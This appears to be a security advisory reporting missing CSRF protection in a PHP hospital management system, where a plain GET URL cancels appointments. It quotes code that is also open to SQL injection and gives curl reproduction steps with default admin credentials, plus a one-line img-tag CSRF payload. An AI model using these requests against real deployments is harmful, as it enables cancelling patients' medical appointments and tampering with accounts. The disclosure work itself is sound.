### Title

No CSRF protection on any state-changing endpoint; appointment cancellation is reachable via a GET request

### Summary

Every form in the application submits to its own endpoint without a CSRF token (`_token`, `csrfmiddlewaretoken`, etc.). The `PHPSESSID` cookie is not marked `SameSite`, so it is sent on cross-site requests. Most importantly, the cancel-appointment action in `admin-panel.php` and `doctor-panel.php` is reachable via a simple `GET` URL. Together these mean that any logged-in user who visits a malicious page will have appointments silently cancelled, prescriptions added in their name, doctors added/removed, and contact messages posted.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Cross-Site Request Forgery (CWE-352)

### Affected Code

File: `admin-panel.php`

```php
if(isset($_GET['cancel'])){
    $query=mysqli_query($con,"update appointmenttb set userStatus='0' where ID = '".$_GET['ID']."'");
    if($query){
        echo "<script>alert('Your appointment successfully cancelled');</script>";
    }
}
```

File: `doctor-panel.php`

```php
if(isset($_GET['cancel'])){
    $query=mysqli_query($con,"update appointmenttb set doctorStatus='0' where ID = '".$_GET['ID']."'");
    if($query){
        echo "<script>alert('Your appointment successfully cancelled');</script>";
    }
}
```

File: `admin-panel1.php`

```php
if(isset($_POST['docsub'])){
    $query="insert into doctb(username,password,email,spec,docFees)values('$doctor','$dpassword','$demail','$spec','$docFees')";
    $result=mysqli_query($con,$query);
}
```

File: `contact.php`

```php
if(isset($_POST['btnSubmit'])){
    $query="insert into contact(name,email,contact,message) values('$name','$email','$contact','$message');";
    $result = mysqli_query($con,$query);
}
```

`Set-Cookie` header (no `SameSite` attribute):

```text
Set-Cookie: PHPSESSID=f21s90u9qdt7n9n90rpsmrva2p; path=/
```

### Root Cause

The application has no CSRF token mechanism at all. Forms do not include a hidden `_token` field, and the server does not validate any such token. The session cookie is also missing `SameSite=lax` or `SameSite=strict`, so it is sent on cross-site requests. The cancel action is reachable via a plain `GET` request, which makes CSRF trivial even for an attacker who cannot craft an HTML form.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Capture the receptionist session:

```bash
COOKIE=$(curl -sS -i "$BASE_URL/func3.php" \
  --data-urlencode "adsub=1" \
  --data-urlencode "username1=admin" \
  --data-urlencode "password2=admin123" \
  | grep -i "set-cookie" | sed -E 's/.*PHPSESSID=([^;]+);.*/\1/')
echo "Receptionist PHPSESSID: $COOKIE"
```

3. Confirm that the session has CSRF relevance by cancelling an appointment via a simple GET URL (no token, no form):

```bash
curl -sS -i "$BASE_URL/admin-panel.php?ID=1&cancel=update" \
  -b "PHPSESSID=$COOKIE" | head -10
```

```text
HTTP/1.1 200 OK
...
<script>alert('Your appointment successfully cancelled');</script>
```

4. The same primitive works as a one-click CSRF. The attacker hosts the following HTML on any origin:

```html
<img src="http://hms.localhost/admin-panel.php?ID=1&cancel=update" alt="">
```

When a logged-in patient (or the receptionist) loads the attacker's page, the browser issues a `GET` request to the cancel URL, the session cookie is automatically attached, and the appointment is silently cancelled. Because the endpoint is also reachable without authentication (CVE-09), the cookie is not required for the unauthenticated variant, but the cookie-based variant works regardless of the missing-auth check.

5. The same CSRF pattern applies to `prescribe.php` (POST), `admin-panel1.php` add/delete doctor (POST), and `contact.php` (POST). An attacker can host an auto-submitting form that calls any of these endpoints with the victim's session cookie.

### Impact

CSRF allows any malicious web page to trigger privileged actions in the victim's authenticated session:

- An attacker can cancel every appointment belonging to a logged-in patient (`admin-panel.php?ID=*&cancel=update`).
- An attacker can cancel every appointment belonging to a logged-in doctor (`doctor-panel.php?ID=*&cancel=update`).
- An attacker can add or remove doctor accounts from the receptionist's session (`admin-panel1.php`).
- An attacker can drop a contact message (`contact.php`) and a stored XSS payload (`admin-panel1.php`/doctor panel) that fires in the receptionist's session.

Combined with the missing `HttpOnly` flag on `PHPSESSID`, an attacker can also chain CSRF with XSS to steal the session cookie.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
Score: 8.1 (High)
```
